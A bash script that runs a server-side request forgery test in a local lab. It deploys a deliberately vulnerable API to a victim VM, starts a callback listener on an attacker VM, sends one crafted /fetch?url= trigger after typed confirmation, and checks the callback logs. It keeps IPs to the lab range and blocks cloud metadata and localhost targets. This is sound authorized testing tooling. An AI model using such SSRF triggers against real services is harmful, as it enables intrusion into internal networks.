#!/usr/bin/env bash
# Operator-run SSRF true attacker callback proof for authorized local lab only.
# Run manually from <attacker-vm>. Do not use against public/unknown targets.
set -Eeuo pipefail

MODE="run"
CLEANUP_ON_EXIT="${CLEANUP_ON_EXIT:-1}"
for arg in "$@"; do
  case "$arg" in
    --precheck-only) MODE="precheck" ;;
    --no-cleanup) CLEANUP_ON_EXIT="0" ;;
    -h|--help)
      cat <<'HELP'
Usage: bash scripts/labs/operator_ssrf_true_callback_run.sh [--precheck-only] [--no-cleanup]

Modes:
  default          Start listener + target, verify route, ask for manual confirmation, then send exactly one SSRF trigger.
  --precheck-only Start listener + target, verify route/listener reachability, then exit before SSRF trigger.
  --no-cleanup    Leave containers running for debugging. Default cleans listener/target on exit.

Local-lab only. Do not use against public/unknown targets.
HELP
      exit 0
      ;;
    *) echo "Unknown argument: $arg" >&2; exit 2 ;;
  esac
done

ATTACKER_IP="${ATTACKER_IP:-<lab-ip>}"
VICTIM_IP="${VICTIM_IP:-<lab-ip>}"
CALLBACK_PORT="${CALLBACK_PORT:-18183}"
TARGET_PORT="${TARGET_PORT:-18081}"
RUN_ID="${RUN_ID:-modern_api_ssrf_operator_$(date -u +%Y%m%dT%H%M%SZ)}"
PROJECT_ROOT="${PROJECT_ROOT:-/mnt/hacking}"
VICTIM_SSH_USER="${VICTIM_SSH_USER:-kali}"
SSH_KEY="${SSH_KEY:-$PROJECT_ROOT/setting/local/ssh/kali_codex_ed25519}"
KNOWN_HOSTS="${KNOWN_HOSTS:-$PROJECT_ROOT/setting/local/ssh/known_hosts}"
SSH_CFG="${SSH_CFG:-$PROJECT_ROOT/setting/local/ssh/empty_ssh_config}"
OUT="$HOME/<artifact-output-dir>/$RUN_ID"
CALLBACK_URL="http://${ATTACKER_IP}:${CALLBACK_PORT}/ssrf-callback?marker=${RUN_ID}"
TARGET_URL="http://${VICTIM_IP}:${TARGET_PORT}"
TRIGGER_URL="${TARGET_URL}/fetch?url=$(python3 - <<PY
from urllib.parse import quote
print(quote('${CALLBACK_URL}', safe=''))
PY
)"

mkdir -p "$OUT" "$OUT/http" "$OUT/callback" "$OUT/cleanup" "$OUT/diagnostics"

log(){ printf '[%s] %s\n' "$(date -u +%H:%M:%SZ)" "$*" | tee -a "$OUT/run.log"; }
fail(){ log "ERROR: $*"; collect_diagnostics || true; exit 1; }

require_local_lab_values(){
  [[ "$ATTACKER_IP" == 192.168.56.* ]] || fail "ATTACKER_IP must stay on host-only lab range <lab-ip>/24"
  [[ "$VICTIM_IP" == 192.168.56.* ]] || fail "VICTIM_IP must stay on host-only lab range <lab-ip>/24"
  [[ "$CALLBACK_URL" == http://192.168.56.* ]] || fail "Callback URL must be host-only lab IP"
  [[ "$TRIGGER_URL" == http://192.168.56.*"/fetch?url="* ]] || fail "Trigger URL must target local modern_vuln_api /fetch only"
  [[ "$TRIGGER_URL" != *169.254.169.254* ]] || fail "cloud metadata endpoints are forbidden"
  [[ "$TRIGGER_URL" != *metadata.google.internal* ]] || fail "cloud metadata endpoints are forbidden"
  [[ "$TRIGGER_URL" != *localhost* && "$TRIGGER_URL" != *127.0.0.1* ]] || fail "localhost/internal trigger URLs are forbidden in this run-card"
}

ssh_victim(){
  ssh -F "$SSH_CFG" -i "$SSH_KEY" -p 22 \
    -o UserKnownHostsFile="$KNOWN_HOSTS" \
    -o StrictHostKeyChecking=accept-new \
    "${VICTIM_SSH_USER}@${VICTIM_IP}" "$@"
}

scp_to_victim(){
  scp -F "$SSH_CFG" -i "$SSH_KEY" -P 22 \
    -o UserKnownHostsFile="$KNOWN_HOSTS" \
    -o StrictHostKeyChecking=accept-new "$@"
}

internet_state(){
  if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then
    echo internet_open
  else
    echo internet_closed
  fi
}

collect_diagnostics(){
  set +e
  log "collecting diagnostics"
  docker ps -a > "$OUT/diagnostics/attacker_docker_ps_a.txt" 2>&1
  ss -ltnp > "$OUT/diagnostics/attacker_ss_ltnp.txt" 2>&1
  docker logs --tail 80 "ssrf-callback-${CALLBACK_PORT}" > "$OUT/diagnostics/attacker_callback_logs.txt" 2>&1
  ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics; docker ps -a > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_docker_ps_a.txt 2>&1; ss -ltnp > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_ss_ltnp.txt 2>&1; docker logs --tail 120 modern-api-ssrf-${TARGET_PORT} > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_target_logs.txt 2>&1 || true; ip -4 -br addr > \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics/victim_ip_addr.txt 2>&1" >/dev/null 2>&1 || true
}

cleanup(){
  set +e
  if [[ "$CLEANUP_ON_EXIT" != "1" ]]; then
    log "cleanup skipped because CLEANUP_ON_EXIT=$CLEANUP_ON_EXIT"
    return 0
  fi
  log "cleanup: removing attacker callback container ssrf-callback-${CALLBACK_PORT}"
  docker rm -f "ssrf-callback-${CALLBACK_PORT}" > "$OUT/cleanup/attacker_listener_cleanup.txt" 2>&1
  internet_state > "$OUT/cleanup/attacker_internet.txt"
  log "cleanup: removing victim target container modern-api-ssrf-${TARGET_PORT}"
  ssh_victim "mkdir -p \$HOME/<artifact-output-dir>/$RUN_ID/cleanup; docker rm -f modern-api-ssrf-${TARGET_PORT} > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/target_cleanup.txt 2>&1 || true; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/victim_internet.txt; else echo internet_closed > \$HOME/<artifact-output-dir>/$RUN_ID/cleanup/victim_internet.txt; fi" >/dev/null 2>&1
  log "cleanup complete; attacker internet: $(cat "$OUT/cleanup/attacker_internet.txt" 2>/dev/null || echo unknown)"
}
trap cleanup EXIT

wait_for_attacker_health(){
  local i code
  for i in $(seq 1 25); do
    code=$(curl -sS -m 2 -o "$OUT/http/pre_health_attempt_${i}.json" -w '%{http_code}' "$TARGET_URL/health" 2>"$OUT/http/pre_health_attempt_${i}.err" || echo 000)
    printf '[%s] pre_health_attempt_%s=%s\n' "$(date -u +%H:%M:%SZ)" "$i" "$code" | tee -a "$OUT/run.log" >&2
    if [[ "$code" == "200" ]]; then
      cp "$OUT/http/pre_health_attempt_${i}.json" "$OUT/http/pre_health.json"
      echo 200
      return 0
    fi
    sleep 1
  done
  echo 000
  return 1
}

wait_for_victim_local_health(){
  ssh_victim "for i in \$(seq 1 20); do code=\$(curl -sS -m 2 -o \$HOME/<artifact-output-dir>/$RUN_ID/http/victim_local_health_attempt_\${i}.json -w '%{http_code}' http://127.0.0.1:${TARGET_PORT}/health 2>\$HOME/<artifact-output-dir>/$RUN_ID/http/victim_local_health_attempt_\${i}.err || echo 000); echo victim_local_health_attempt_\${i}=\$code; if [ \"\$code\" = 200 ]; then exit 0; fi; sleep 1; done; exit 1"
}

require_local_lab_values

log "RUN_ID=$RUN_ID"
log "MODE=$MODE CLEANUP_ON_EXIT=$CLEANUP_ON_EXIT"
log "OUT=$OUT"
log "ATTACKER_IP=$ATTACKER_IP VICTIM_IP=$VICTIM_IP"
log "CALLBACK_URL=$CALLBACK_URL"
log "TRIGGER_URL=$TRIGGER_URL"

[[ -d "$PROJECT_ROOT" ]] || fail "PROJECT_ROOT not found: $PROJECT_ROOT"
[[ -f "$PROJECT_ROOT/tmp/ssrf_docker_listener.py" ]] || fail "missing listener helper: $PROJECT_ROOT/tmp/ssrf_docker_listener.py"
[[ -f "$PROJECT_ROOT/labs/modern_vuln_api/modern_vuln_api.py" ]] || fail "missing target source"
[[ -f "$SSH_KEY" ]] || fail "missing SSH key: $SSH_KEY"
command -v docker >/dev/null || fail "docker missing on attacker VM"
command -v curl >/dev/null || fail "curl missing"
command -v python3 >/dev/null || fail "python3 missing"

log "checking attacker/victim Internet posture"
internet_state | tee "$OUT/attacker_internet_pre.txt"
ssh_victim "if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open; else echo internet_closed; fi" | tee "$OUT/victim_internet_pre.txt"

log "starting attacker Docker-published callback listener"
docker rm -f "ssrf-callback-${CALLBACK_PORT}" >/dev/null 2>&1 || true
docker run -d --name "ssrf-callback-${CALLBACK_PORT}" \
  -p "0.0.0.0:${CALLBACK_PORT}:8080" \
  -v "$PROJECT_ROOT/tmp/ssrf_docker_listener.py:/listener.py:ro" \
  -v "$OUT/callback:/out" \
  python:3-alpine python /listener.py | tee "$OUT/callback/container_id.txt"
docker ps | grep "ssrf-callback-${CALLBACK_PORT}" | tee "$OUT/callback/docker_ps.txt"

log "copying and starting victim target"
ssh_victim "mkdir -p /home/kali/hermes-labs/modern_vuln_api \$HOME/<artifact-output-dir>/$RUN_ID/http \$HOME/<artifact-output-dir>/$RUN_ID/cleanup \$HOME/<artifact-output-dir>/$RUN_ID/diagnostics"
scp_to_victim "$PROJECT_ROOT/labs/modern_vuln_api/modern_vuln_api.py" "${VICTIM_SSH_USER}@${VICTIM_IP}:/home/kali/hermes-labs/modern_vuln_api/modern_vuln_api.py"
ssh_victim "docker rm -f modern-api-ssrf-${TARGET_PORT} >/dev/null 2>&1 || true; docker run -d --name modern-api-ssrf-${TARGET_PORT} -p 0.0.0.0:${TARGET_PORT}:${TARGET_PORT} -v /home/kali/hermes-labs/modern_vuln_api:/app:ro python:3-alpine python /app/modern_vuln_api.py --host 0.0.0.0 --port ${TARGET_PORT}; docker ps | grep modern-api-ssrf-${TARGET_PORT}" | tee "$OUT/http/victim_target_start.txt"

log "waiting for victim local health"
wait_for_victim_local_health | tee "$OUT/http/victim_local_health_wait.txt" || fail "victim local health failed"

log "waiting for attacker-to-victim pre-health"
PRE_CODE=$(wait_for_attacker_health || true)
log "pre_health=$PRE_CODE"
[[ "$PRE_CODE" == "200" ]] || fail "attacker-to-victim pre-health failed"

log "listener reachability precheck from victim to attacker"
ssh_victim "curl -sS -m 5 -o \$HOME/<artifact-output-dir>/$RUN_ID/http/listener_probe.txt -w '%{http_code}' '${CALLBACK_URL}&phase=precheck'" | tee "$OUT/http/listener_probe_code.txt"
sleep 1
if ! grep -q "phase=precheck" "$OUT/callback/requests.jsonl" 2>/dev/null; then
  fail "listener precheck did not appear in callback log"
fi
if ! grep -q "$RUN_ID" "$OUT/callback/requests.jsonl" 2>/dev/null; then
  fail "listener precheck marker missing"
fi
log "listener precheck OK"

if [[ "$MODE" == "precheck" ]]; then
  cat > "$OUT/summary.md" <<EOF
# SSRF operator precheck only

run_id: $RUN_ID
mode: precheck-only
target: $TARGET_URL
callback: $CALLBACK_URL
pre_health: $PRE_CODE
listener_precheck: ok
verdict: setup_ready_no_ssrf_trigger_sent
EOF
  log "PRECHECK_ONLY complete: no SSRF trigger sent"
  log "summary=$OUT/summary.md"
  exit 0
fi

cat <<EOF | tee "$OUT/operator_confirmation.txt"

About to send EXACTLY ONE SSRF trigger request from attacker VM to local victim target:

  $TRIGGER_URL

Expected server-side callback destination:

  $CALLBACK_URL

Boundaries:
- local lab only
- no metadata endpoint
- no localhost/internal scan
- no public OAST
- exactly one trigger request

EOF

printf 'Type RUN_SSRF_ON_LOCAL_LAB to execute the one trigger: '
read -r CONFIRM
if [[ "$CONFIRM" != "RUN_SSRF_ON_LOCAL_LAB" ]]; then
  fail "operator did not confirm trigger"
fi

log "sending exactly one SSRF trigger"
SSRF_CODE=$(curl -sS -m 8 -o "$OUT/http/ssrf_trigger_response.json" -w '%{http_code}' "$TRIGGER_URL" || echo 000)
log "ssrf_trigger=$SSRF_CODE"
sleep 1

log "post-health"
POST_CODE=$(curl -sS -m 5 -o "$OUT/http/post_health.json" -w '%{http_code}' "$TARGET_URL/health" || echo 000)
log "post_health=$POST_CODE"

CALLBACK_HIT=no
SOURCE_OK=no
TRIGGER_PATH_OK=no
if grep -q "$RUN_ID" "$OUT/callback/requests.jsonl" 2>/dev/null; then CALLBACK_HIT=yes; fi
if grep -q "$VICTIM_IP" "$OUT/callback/requests.jsonl" 2>/dev/null; then SOURCE_OK=yes; fi
if grep -q "/ssrf-callback" "$OUT/callback/requests.jsonl" 2>/dev/null; then TRIGGER_PATH_OK=yes; fi

cat > "$OUT/summary.md" <<EOF
# SSRF true attacker callback operator run

run_id: $RUN_ID
target: $TARGET_URL
callback: $CALLBACK_URL
pre_health: $PRE_CODE
ssrf_trigger_status: $SSRF_CODE
post_health: $POST_CODE
callback_marker_found: $CALLBACK_HIT
callback_source_victim_ip_found: $SOURCE_OK
callback_trigger_path_found: $TRIGGER_PATH_OK

## Boundary

Local authorized lab only. Exactly one SSRF trigger. No metadata endpoints, localhost/internal scan, public OAST, secrets, credentials, or exfiltration.

## Key artifacts

- http/pre_health.json
- http/ssrf_trigger_response.json
- http/post_health.json
- callback/requests.jsonl
- cleanup/
EOF

log "callback_marker_found=$CALLBACK_HIT callback_source_victim_ip_found=$SOURCE_OK callback_trigger_path_found=$TRIGGER_PATH_OK"
log "summary=$OUT/summary.md"

if [[ "$PRE_CODE" == "200" && "$POST_CODE" == "200" && "$CALLBACK_HIT" == "yes" && "$SOURCE_OK" == "yes" && "$TRIGGER_PATH_OK" == "yes" ]]; then
  log "VERDICT=verified_impact_lab_only"
else
  log "VERDICT=attempted_not_verified"
fi

log "Script completed. Cleanup will run automatically now. Pull $OUT back to Windows afterward if needed."
